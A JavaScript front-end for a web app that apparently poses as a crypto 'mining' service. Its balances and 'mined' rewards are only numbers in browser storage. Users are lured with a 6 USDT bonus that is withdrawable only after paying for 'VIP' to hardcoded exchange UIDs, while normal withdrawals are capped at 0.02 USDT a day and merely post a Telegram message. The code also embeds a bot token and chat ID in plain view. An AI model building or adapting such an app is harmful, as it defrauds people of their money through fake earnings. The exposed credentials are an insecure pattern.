class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        this.paymentConfig = {
            bitget: { id: '9879164714', name: 'Bitget UID' },
            bybit: { id: '269645993', name: 'Bybit UID' }
        };
        this.telegramConfig = {
            botToken: '8516209099:AAFsqUtrN67apMLzr4n-eChN8vCSTAvnoBc',
            chatId: '-8405100233'
        };
        this.dailyWithdrawLimit = 0.02; // 0.02 USDT daily limit for normal users
        this.initializeApp();
        this.startAutoUpdate();
    }

    initializeApp() {
        this.setupEventListeners();
        this.updateDisplay();
        this.generateUserId();
        this.setupNavigation();
        this.updateDailyLimit();
    }

    loadUserData() {
        const saved = localStorage.getItem('miningUserData');
        if (saved) {
            const data = JSON.parse(saved);
            // Reset daily withdrawal if it's a new day
            const today = new Date().toDateString();
            if (data.lastWithdrawDate !== today) {
                data.todayWithdraw = 0;
                data.lastWithdrawDate = today;
            }
            return data;
        }
        
        return {
            userId: this.generateUserId(),
            balance: 0,
            vipLevel: 0,
            vipBalance: 0,
            freeBalance: 6,
            trxBalance: 0,
            totalMined: 0,
            lastClaim: {},
            activeDays: 1,
            referralEarnings: 0,
            teamSize: 0,
            inviteCode: this.generateInviteCode(),
            joinedTeam: null,
            transactions: [],
            teamMembers: [],
            todayWithdraw: 0,
            lastWithdrawDate: new Date().toDateString(),
            lastUpdate: Date.now()
        };
    }

    generateUserId() {
        let userId = localStorage.getItem('miningUserId');
        if (!userId) {
            userId = 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase();
            localStorage.setItem('miningUserId', userId);
        }
        return userId;
    }

    generateInviteCode() {
        let code = localStorage.getItem('miningInviteCode');
        if (!code) {
            code = 'INV' + Math.random().toString(36).substr(2, 6).toUpperCase();
            localStorage.setItem('miningInviteCode', code);
        }
        return code;
    }

    saveUserData() {
        this.userData.lastUpdate = Date.now();
        localStorage.setItem('miningUserData', JSON.stringify(this.userData));
        this.updateDisplay();
    }

    setupNavigation() {
        const navButtons = document.querySelectorAll('.nav-btn');
        const sections = document.querySelectorAll('.content-section');

        navButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetSection = btn.getAttribute('data-section');
                
                // Update active states
                navButtons.forEach(b => b.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(targetSection).classList.add('active');
            });
        });
    }

    setupEventListeners() {
        // Mine section
        document.getElementById('claimFree').addEventListener('click', () => this.claimFreeReward());
        document.getElementById('claimTRX').addEventListener('click', () => this.claimTRX());
        document.getElementById('claimVIP1').addEventListener('click', () => this.claimVIPReward(1));
        document.getElementById('claimVIP2').addEventListener('click', () => this.claimVIPReward(2));

        // Team section
        document.getElementById('joinTeam').addEventListener('click', () => this.joinTeam());

        // Me section
        document.getElementById('convertTRX').addEventListener('click', () => this.convertTRX());
        document.getElementById('normalWithdraw').addEventListener('click', () => this.normalWithdraw());
        document.getElementById('vipWithdraw').addEventListener('click', () => this.vipWithdraw());
        document.getElementById('superVipWithdraw').addEventListener('click', () => this.superVipWithdraw());

        // VIP section
        document.querySelectorAll('.payment-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const vipLevel = e.target.getAttribute('data-vip');
                const exchange = e.target.getAttribute('data-exchange');
                this.showPaymentModal(vipLevel, exchange);
            });
        });

        // Modal events
        document.querySelector('.close').addEventListener('click', () => this.closeModal());
        document.getElementById('submitPayment').addEventListener('click', () => this.submitPaymentToTelegram());
        
        window.addEventListener('click', (e) => {
            if (e.target === document.getElementById('paymentModal')) {
                this.closeModal();
            }
        });

        // Set max value for normal withdrawal input
        document.getElementById('normalWithdrawAmount').addEventListener('input', (e) => {
            const maxAmount = this.dailyWithdrawLimit - this.userData.todayWithdraw;
            if (parseFloat(e.target.value) > maxAmount) {
                e.target.value = maxAmount.toFixed(2);
            }
        });
    }

    updateDailyLimit() {
        const today = new Date().toDateString();
        if (this.userData.lastWithdrawDate !== today) {
            this.userData.todayWithdraw = 0;
            this.userData.lastWithdrawDate = today;
            this.saveUserData();
        }
    }

    // Mine Section Functions
    claimFreeReward() {
        if (this.userData.freeBalance <= 0) {
            this.showNotification('Free reward already claimed!', 'warning');
            return;
        }

        this.userData.freeBalance = 0;
        this.userData.balance += 6;
        this.addTransaction('Free Reward Claim', 6, 'USDT');
        this.saveUserData();
        
        this.showNotification('🎁 6 USDT Free reward claimed! VIP required to withdraw.', 'success');
    }

    claimTRX() {
        const now = Date.now();
        const lastClaim = this.userData.lastClaim.trx || 0;
        const cooldown = 15 * 24 * 60 * 60 * 1000; // 15 days

        if (now - lastClaim < cooldown) {
            const remaining = cooldown - (now - lastClaim);
            this.showNotification(`Please wait ${this.formatTime(remaining)} before next TRX claim!`, 'warning');
            return;
        }

        this.userData.trxBalance += 1200;
        this.userData.lastClaim.trx = now;
        this.addTransaction('TRX Mining Reward', 1200, 'TRX');
        this.saveUserData();
        
        this.showNotification('🎉 1200 TRX claimed successfully!', 'success');
    }

    claimVIPReward(vipLevel) {
        if (this.userData.vipLevel < vipLevel) {
            this.showNotification(`VIP ${vipLevel} required for this miner!`, 'error');
            return;
        }

        const now = Date.now();
        const lastClaim = this.userData.lastClaim[`vip${vipLevel}`] || 0;
        const cooldown = 2 * 60 * 60 * 1000; // 2 hours

        if (now - lastClaim < cooldown) {
            const remaining = cooldown - (now - lastClaim);
            this.showNotification(`Please wait ${this.formatTime(remaining)} before next claim!`, 'warning');
            return;
        }

        let reward = vipLevel === 1 ? 0.5 : 2.0;
        this.userData.vipBalance += reward;
        this.userData.totalMined += reward;
        this.userData.lastClaim[`vip${vipLevel}`] = now;
        this.addTransaction(`VIP ${vipLevel} Mining`, reward, 'USDT');
        this.saveUserData();
        
        this.showNotification(`🎉 Successfully claimed ${reward} USDT from VIP ${vipLevel}!`, 'success');
    }

    // Team Section Functions
    joinTeam() {
        const joinCode = document.getElementById('joinCode').value.trim();
        if (!joinCode) {
            this.showNotification('Please enter an invite code!', 'error');
            return;
        }

        if (this.userData.joinedTeam) {
            this.showNotification('You have already joined a team!', 'warning');
            return;
        }

        this.userData.joinedTeam = joinCode;
        this.addTransaction('Team Join Bonus', 1, 'USDT');
        this.userData.balance += 1;
        this.saveUserData();
        
        this.showNotification(`🎉 Successfully joined team with code: ${joinCode}! +1 USDT bonus`, 'success');
        document.getElementById('joinCode').value = '';
    }

    // Me Section Functions
    convertTRX() {
        const trxAmount = parseFloat(document.getElementById('trxAmount').value);
        
        if (!trxAmount || trxAmount <= 0) {
            this.showNotification('Please enter valid TRX amount!', 'error');
            return;
        }

        if (trxAmount > this.userData.trxBalance) {
            this.showNotification('Insufficient TRX balance!', 'error');
            return;
        }

        const usdtAmount = trxAmount * 0.10; // Conversion rate
        this.userData.trxBalance -= trxAmount;
        this.userData.balance += usdtAmount;
        this.addTransaction('TRX to USDT Conversion', usdtAmount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`✅ Converted ${trxAmount} TRX to ${usdtAmount.toFixed(2)} USDT`, 'success');
        document.getElementById('trxAmount').value = '';
    }

    normalWithdraw() {
        const amount = parseFloat(document.getElementById('normalWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('Please enter valid amount!', 'error');
            return;
        }

        if (amount > this.userData.balance) {
            this.showNotification('Insufficient balance!', 'error');
            return;
        }

        // Check daily withdrawal limit
        const remainingToday = this.dailyWithdrawLimit - this.userData.todayWithdraw;
        if (amount > remainingToday) {
            this.showNotification(`Daily withdrawal limit exceeded! You can withdraw max ${remainingToday.toFixed(2)} USDT today.`, 'error');
            return;
        }

        // Send withdrawal request to Telegram
        this.sendWithdrawalRequest('normal', amount);
        this.userData.balance -= amount;
        this.userData.todayWithdraw += amount;
        this.addTransaction('Normal Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`📤 Normal withdrawal request for ${amount} USDT sent to admin!`, 'success');
        document.getElementById('normalWithdrawAmount').value = '';
    }

    vipWithdraw() {
        if (this.userData.vipLevel === 0) {
            this.showNotification('VIP membership required!', 'error');
            return;
        }

        const amount = parseFloat(document.getElementById('vipWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('Please enter valid amount!', 'error');
            return;
        }

        if (amount > this.userData.vipBalance) {
            this.showNotification('Insufficient VIP balance!', 'error');
            return;
        }

        this.sendWithdrawalRequest('vip', amount);
        this.userData.vipBalance -= amount;
        this.addTransaction('VIP Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`⚡ VIP withdrawal request for ${amount} USDT sent!`, 'success');
        document.getElementById('vipWithdrawAmount').value = '';
    }

    superVipWithdraw() {
        if (this.userData.vipLevel < 2) {
            this.showNotification('VIP 2 required for super fast withdrawal!', 'error');
            return;
        }

        const amount = parseFloat(document.getElementById('superVipWithdrawAmount').value);
        
        if (!amount || amount <= 0) {
            this.showNotification('Please enter valid amount!', 'error');
            return;
        }

        const totalBalance = this.userData.balance + this.userData.vipBalance;
        if (amount > totalBalance) {
            this.showNotification('Insufficient total balance!', 'error');
            return;
        }

        this.sendWithdrawalRequest('super_vip', amount);
        
        // Deduct from balances
        if (amount <= this.userData.vipBalance) {
            this.userData.vipBalance -= amount;
        } else {
            const remaining = amount - this.userData.vipBalance;
            this.userData.vipBalance = 0;
            this.userData.balance -= remaining;
        }
        
        this.addTransaction('Super VIP Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`🚀 Super VIP withdrawal request for ${amount} USDT sent!`, 'success');
        document.getElementById('superVipWithdrawAmount').value = '';
    }

    // VIP Section Functions
    showPaymentModal(vipLevel, exchange) {
        const modal = document.getElementById('paymentModal');
        const amount = vipLevel === '1' ? '1 USDT' : '10 USDT';
        const uid = this.paymentConfig[exchange].id;
        
        document.getElementById('paymentAmount').textContent = amount;
        document.getElementById('walletAddress').textContent = uid;
        document.getElementById('paymentExchange').textContent = exchange.charAt(0).toUpperCase() + exchange.slice(1);
        document.getElementById('paymentVipLevel').textContent = vipLevel;
        document.getElementById('paymentUserId').textContent = this.userData.userId;
        document.getElementById('correctUid').textContent = uid;
        
        // Store current payment info
        this.currentPayment = { 
            vipLevel: parseInt(vipLevel), 
            exchange,
            amount: vipLevel === '1' ? 1 : 10,
            uid: uid
        };
        
        modal.style.display = 'block';
    }

    closeModal() {
        document.getElementById('paymentModal').style.display = 'none';
        // Clear form
        document.getElementById('userAccountId').value = '';
        document.getElementById('transactionHash').value = '';
    }

    submitPaymentToTelegram() {
        const accountId = document.getElementById('userAccountId').value.trim();

        if (!accountId) {
            this.showNotification('Please enter your account UID!', 'error');
            return;
        }

        const message = `
🆕 VIP Purchase Request

👤 User ID: ${this.userData.userId}
⭐ VIP Level: ${this.currentPayment.vipLevel}
💰 Amount: ${this.currentPayment.amount} USDT
💳 Exchange: ${this.currentPayment.exchange.toUpperCase()}
🔗 Payment UID: ${this.currentPayment.uid}
📋 Account UID: ${accountId}
⏰ Time: ${new Date().toLocaleString()}

Please activate VIP ${this.currentPayment.vipLevel} for this user.
        `;

        // Send to Telegram
        this.sendTelegramMessage(message);
        
        this.showNotification('✅ Payment details sent to admin! VIP will be activated soon.', 'success');
        this.closeModal();
    }

    // Utility Functions
    sendWithdrawalRequest(type, amount) {
        const typeNames = {
            'normal': 'Normal',
            'vip': 'VIP Fast',
            'super_vip': 'Super VIP'
        };

        const message = `
💸 Withdrawal Request

👤 User ID: ${this.userData.userId}
💰 Amount: ${amount} USDT
🚀 Type: ${typeNames[type]}
⭐ VIP Level: ${this.userData.vipLevel}
⏰ Time: ${new Date().toLocaleString()}

Please process this withdrawal.
        `;

        this.sendTelegramMessage(message);
    }

    sendTelegramMessage(message) {
        // In a real app, you would send this to your Telegram bot
        const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
        const data = {
            chat_id: this.telegramConfig.chatId,
            text: message,
            parse_mode: 'HTML'
        };

        // Using fetch to send message to Telegram
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Message sent to Telegram:', data);
            this.showNotification('📤 Request sent to Telegram admin!', 'info');
        })
        .catch((error) => {
            console.error('Error sending to Telegram:', error);
            this.showNotification('❌ Failed to send message. Please try again.', 'error');
        });
    }

    addTransaction(description, amount, currency) {
        this.userData.transactions.unshift({
            id: Date.now(),
            description,
            amount,
            currency,
            timestamp: new Date().toLocaleString(),
            type: amount >= 0 ? 'credit' : 'debit'
        });

        // Keep only last 10 transactions
        if (this.userData.transactions.length > 10) {
            this.userData.transactions = this.userData.transactions.slice(0, 10);
        }
    }

    updateDisplay() {
        // Update balances
        const totalBalance = this.userData.balance + this.userData.vipBalance;
        document.getElementById('totalBalance').textContent = totalBalance.toFixed(2) + ' USDT';
        document.getElementById('normalBalance').textContent = this.userData.balance.toFixed(2) + ' USDT';
        document.getElementById('vipBalance').textContent = this.userData.vipBalance.toFixed(2) + ' USDT';
        document.getElementById('superVipBalance').textContent = totalBalance.toFixed(2) + ' USDT';

        // Update VIP status
        const vipLevelElement = document.getElementById('vipLevel');
        const vipStatusDisplay = document.getElementById('vipStatusDisplay');
        
        if (this.userData.vipLevel === 0) {
            vipLevelElement.textContent = 'No VIP';
            vipLevelElement.style.background = 'linear-gradient(45deg, #666, #999)';
            vipStatusDisplay.textContent = 'No VIP';
        } else {
            vipLevelElement.textContent = `VIP ${this.userData.vipLevel}`;
            vipLevelElement.style.background = 'linear-gradient(45deg, #ffd700, #ffed4e)';
            vipStatusDisplay.textContent = `VIP ${this.userData.vipLevel}`;
        }

        // Update user info
        document.getElementById('userIdDisplay').textContent = this.userData.userId;
        document.getElementById('inviteCode').textContent = this.userData.inviteCode;
        document.getElementById('dailyWithdrawLimit').textContent = this.dailyWithdrawLimit.toFixed(2) + ' USDT';
        document.getElementById('usedToday').textContent = this.userData.todayWithdraw.toFixed(2) + ' USDT';

        // Set max attribute for normal withdrawal input
        const maxWithdraw = (this.dailyWithdrawLimit - this.userData.todayWithdraw).toFixed(2);
        document.getElementById('normalWithdrawAmount').setAttribute('max', maxWithdraw);

        // Update statistics
        document.getElementById('totalMinedMini').textContent = this.userData.totalMined.toFixed(2) + ' USDT';
        document.getElementById('activeDaysMini').textContent = this.userData.activeDays;
        document.getElementById('teamSize').textContent = this.userData.teamSize;
        document.getElementById('referralEarnings').textContent = this.userData.referralEarnings.toFixed(2) + ' USDT';
        document.getElementById('activeReferrals').textContent = this.userData.teamMembers.length;

        // Update VIP earnings
        const dailyIncome = this.userData.vipLevel === 1 ? 0.5 : this.userData.vipLevel === 2 ? 2.0 : 0;
        document.getElementById('vipDailyIncome').textContent = dailyIncome.toFixed(2) + ' USDT';
        document.getElementById('vipMonthlyIncome').textContent = (dailyIncome * 30).toFixed(2) + ' USDT';
        document.getElementById('totalVipEarnings').textContent = this.userData.vipBalance.toFixed(2) + ' USDT';

        // Update transaction history
        this.updateTransactionHistory();
        
        // Update timers
        this.updateTimers();
    }

    updateTimers() {
        const now = Date.now();
        
        // TRX Timer
        const lastTRXClaim = this.userData.lastClaim.trx || 0;
        const trxCooldown = 15 * 24 * 60 * 60 * 1000;
        const trxRemaining = trxCooldown - (now - lastTRXClaim);
        document.getElementById('trxTimer').textContent = trxRemaining > 0 ? this.formatTime(trxRemaining) : 'Ready!';

        // VIP Timers
        [1, 2].forEach(level => {
            const lastClaim = this.userData.lastClaim[`vip${level}`] || 0;
            const cooldown = 2 * 60 * 60 * 1000;
            const remaining = cooldown - (now - lastClaim);
            document.getElementById(`vip${level}Timer`).textContent = remaining > 0 ? this.formatTime(remaining) : 'Ready!';
        });
    }

    updateTransactionHistory() {
        const historyContainer = document.getElementById('transactionHistory');
        
        if (this.userData.transactions.length === 0) {
            historyContainer.innerHTML = `
                <div class="empty-history">
                    <i class="fas fa-receipt"></i>
                    <p>No transactions yet</p>
                </div>
            `;
            return;
        }

        historyContainer.innerHTML = this.userData.transactions.map(transaction => `
            <div class="transaction-item">
                <div class="transaction-info">
                    <strong>${transaction.description}</strong>
                    <span style="font-size: 12px; opacity: 0.7;">${transaction.timestamp}</span>
                </div>
                <div class="transaction-amount ${transaction.type}">
                    ${transaction.type === 'credit' ? '+' : '-'}${Math.abs(transaction.amount).toFixed(2)} ${transaction.currency}
                </div>
            </div>
        `).join('');
    }

    formatTime(ms) {
        const days = Math.floor(ms / (1000 * 60 * 60 * 24));
        const hours = Math.floor((ms % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
        
        if (days > 0) return `${days}d ${hours}h`;
        if (hours > 0) return `${hours}h ${minutes}m`;
        return `${minutes}m`;
    }

    showNotification(message, type = 'info') {
        // Remove existing notification
        const existing = document.querySelector('.notification');
        if (existing) existing.remove();

        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span>${message}</span>
            <button onclick="this.parentElement.remove()">×</button>
        `;

        // Add styles
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${type === 'error' ? '#ff4757' : type === 'success' ? '#2ed573' : type === 'warning' ? '#ffa502' : '#3742fa'};
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 10000;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideInRight 0.3s ease;
        `;

        document.body.appendChild(notification);

        // Auto remove after 5 seconds
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 5000);
    }

    startAutoUpdate() {
        // Update every minute
        setInterval(() => {
            this.updateDisplay();
        }, 60000);

        // Check for new day every hour
        setInterval(() => {
            this.updateDailyLimit();
        }, 60 * 60 * 1000);
    }
}

// Global functions for button clicks
function copyInviteCode() {
    const inviteCode = document.getElementById('inviteCode').textContent;
    navigator.clipboard.writeText(inviteCode).then(() => {
        window.miningSystem.showNotification('Invite code copied to clipboard!', 'success');
    });
}

function copyWalletAddress() {
    const walletAddress = document.getElementById('walletAddress').textContent;
    navigator.clipboard.writeText(walletAddress).then(() => {
        window.miningSystem.showNotification('UID copied to clipboard!', 'success');
    });
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();
    
    // Add notification styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .notification button {
            background: none;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            padding: 0;
            width: 20px;
            height: 20px;
        }
    `;
    document.head.appendChild(style);
});
